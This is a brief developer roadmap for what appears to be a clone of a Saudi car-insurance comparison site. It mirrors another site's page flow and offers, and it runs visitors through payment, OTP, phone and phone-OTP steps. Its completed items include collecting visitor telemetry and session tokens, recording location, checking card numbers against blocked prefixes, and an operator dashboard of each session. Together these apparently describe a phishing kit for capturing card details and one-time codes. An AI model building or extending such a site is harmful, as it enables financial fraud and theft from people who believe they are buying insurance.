# Roadmap

- [x] Add تكافل الراجحي under ضد الغير + drop prices ~10-15%
- [x] DB: user_info + session_token columns, ops_settings table
- [x] Tracker: collect userInfo telemetry + ins_sestoken (socket.ts)
- [x] track.ts: store userInfo/sessionToken + city/region geo
- [x] card-check endpoint + blockedCardPrefixes (control API + dashboard UI + Payment page enforcement)
- [x] Dashboard: map userInfo, Device & Location section in session modal
- [x] Gate: quote/insurer/compare/register pages pass freely — hold only from payment onward

## 2026-08-31
- Align site page flow to tamnbcare.online (Home → /insurance/car → /compare → /reg → /payment → /otp → /phone → /phoneOtp → success). Verified — matches.
- Sync offers (companies, prices, ratings) with tamnbcare.online/compare (40 offers). Add missing الراجحي تكافل offer; correct rating mismatches.
